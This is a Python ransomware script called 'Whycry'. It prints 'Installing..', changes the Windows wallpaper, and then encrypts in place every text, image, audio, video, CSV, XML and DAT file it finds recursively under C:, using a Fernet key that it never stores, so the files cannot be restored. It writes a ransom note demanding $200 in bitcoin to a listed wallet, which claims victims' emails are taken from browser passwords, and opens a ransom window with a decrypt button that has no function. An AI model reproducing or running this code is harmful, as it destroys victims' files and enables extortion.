import struct
import ctypes
import glob
import os
from cryptography.fernet import Fernet
from sys import argv
from tkinter import *
from pathlib import Path

print("Installing..")

#Wallpaper Change

SPI_SETDESKWALLPAPER = 20
WALLPAPER_PATH = 'C:\\Users\\gf3re\\rw\\img\\wallpaper.png'


def is_64_windows():
    """Find out how many bits is OS. """
    return struct.calcsize('P') * 8 == 64


def get_sys_parameters_info():
    """Based on if this is 32bit or 64bit returns correct version of SystemParametersInfo function. """
    return ctypes.windll.user32.SystemParametersInfoW if is_64_windows() \
        else ctypes.windll.user32.SystemParametersInfoA


def change_wallpaper():
    sys_parameters_info = get_sys_parameters_info()
    r = sys_parameters_info(SPI_SETDESKWALLPAPER, 0, WALLPAPER_PATH, 3)

    if not r:
        print(ctypes.WinError())

change_wallpaper()

#Encryption

key = Fernet.generate_key()

fernet = Fernet(key)

filelist = sorted(Path('C:\\').rglob('*.txt'))

for files in filelist:
    try:
        with open(files, "rb") as file:
            original = file.read()

        encrypted = fernet.encrypt(original)

        with open(files, "wb") as encrypted_file:
            encrypted_file.write(encrypted)
    except:
        pass

filelist = sorted(Path('C:\\').rglob('*.mp4'))

for files in filelist:
    try:
        with open(files, "rb") as file:
            original = file.read()

        encrypted = fernet.encrypt(original)

        with open(files, "wb") as encrypted_file:
            encrypted_file.write(encrypted)
    except:
        pass

filelist = sorted(Path('C:\\').rglob('*.mp3'))

for files in filelist:
    try:
        with open(files, "rb") as file:
            original = file.read()

        encrypted = fernet.encrypt(original)

        with open(files, "wb") as encrypted_file:
            encrypted_file.write(encrypted)
    except:
        pass

filelist = sorted(Path('C:\\').rglob('*.rtf'))

for files in filelist:
    try:
        with open(files, "rb") as file:
            original = file.read()

        encrypted = fernet.encrypt(original)

        with open(files, "wb") as encrypted_file:
            encrypted_file.write(encrypted)
    except:
        pass

filelist = sorted(Path('C:\\').rglob('*.jfif'))

for files in filelist:
    try:
        with open(files, "rb") as file:
            original = file.read()

        encrypted = fernet.encrypt(original)

        with open(files, "wb") as encrypted_file:
            encrypted_file.write(encrypted)
    except:
        pass

filelist = sorted(Path('C:\\').rglob('*.png'))

for files in filelist:
    try:
        with open(files, "rb") as file:
            original = file.read()

        encrypted = fernet.encrypt(original)

        with open(files, "wb") as encrypted_file:
            encrypted_file.write(encrypted)
    except:
        pass

filelist = sorted(Path('C:\\').rglob('*.jpg'))

for files in filelist:
    try:
        with open(files, "rb") as file:
            original = file.read()

        encrypted = fernet.encrypt(original)

        with open(files, "wb") as encrypted_file:
            encrypted_file.write(encrypted)
    except:
        pass

filelist = sorted(Path('C:\\').rglob('*.jpeg'))

for files in filelist:
    try:
        with open(files, "rb") as file:
            original = file.read()

        encrypted = fernet.encrypt(original)

        with open(files, "wb") as encrypted_file:
            encrypted_file.write(encrypted)
    except:
        pass

filelist = sorted(Path('C:\\').rglob('*.csv'))

for files in filelist:
    try:
        with open(files, "rb") as file:
            original = file.read()

        encrypted = fernet.encrypt(original)

        with open(files, "wb") as encrypted_file:
            encrypted_file.write(encrypted)
    except:
        pass

filelist = sorted(Path('C:\\').rglob('*.dat'))

for files in filelist:
    try:
        with open(files, "rb") as file:
            original = file.read()

        encrypted = fernet.encrypt(original)

        with open(files, "wb") as encrypted_file:
            encrypted_file.write(encrypted)
    except:
        pass

filelist = sorted(Path('C:\\').rglob('*.xml'))

for files in filelist:
    try:
        with open(files, "rb") as file:
            original = file.read()

        encrypted = fernet.encrypt(original)

        with open(files, "wb") as encrypted_file:
            encrypted_file.write(encrypted)
    except:
        pass

filelist = sorted(Path('C:\\').rglob('*.wav'))

for files in filelist:
    try:
        with open(files, "rb") as file:
            original = file.read()

        encrypted = fernet.encrypt(original)

        with open(files, "wb") as encrypted_file:
            encrypted_file.write(encrypted)
    except:
        pass

filelist = sorted(Path('C:\\').rglob('*.mov'))

for files in filelist:
    try:
        with open(files, "rb") as file:
            original = file.read()

        encrypted = fernet.encrypt(original)

        with open(files, "wb") as encrypted_file:
            encrypted_file.write(encrypted)
    except:
        pass

#Create note.txt
f = open("note.txt", "w+")

f.write("Your important files have been encrypted using millitary grade encryption\nTo get your files back, the only way to do so is to pay\n$200 worth of bitcoin to\nbc1q8j527wn79uwvql3hc455w954mj49ht0puq7ugn\nAfter you pay you will recieve an email from us in 1-18 hours with your decryption key\nWe get this email from your browser passwords\nFeel safe, we take no other passwords, and this is only so we can contact you.")

f.close()

#Window

window = Tk()

window.title("Whycry")
window.configure(width=800, height=700)
window.configure(bg="darkgray")
window.resizable(False, False)

canvas = Canvas(window, width=800, height=700, bg="darkgray")

canvas.create_text(400, 50, text="Your important files have been encrypted", fill="red", font=('Helvetica 30 bold'))
canvas.create_text(400, 200, text="Read the wallpaper for info, if the wallpaper did not change, view note.txt", fill="red", font=('Helvetica 16 bold'))
canvas.create_text(400, 350, text="Send $200 worth of bitcoin to the address below", fill="red", font=('Helvetica 16 bold'))
canvas.create_text(400, 500, text="Address -> bc1q8j527wn79uwvql3hc455w954mj49ht0puq7ugn", fill="red", font=('Helvetica 20 bold'))
canvas.create_text(400, 650, text="Put your decryption key below", fill="red", font=('Helvetica 20 bold'))
canvas.pack()

text = Text(window, height=8)
text.pack()

btnRead = Button(window, height=1, width=10, text="Decrypt")

btnRead.pack()



winWidth = window.winfo_reqwidth()
winwHeight = window.winfo_reqheight()
posRight = int(window.winfo_screenwidth() / 2 - winWidth / 2)
posDown = int(window.winfo_screenheight() / 2 - winwHeight / 2 - 125)
window.geometry("+{}+{}".format(posRight, posDown))

window.mainloop()
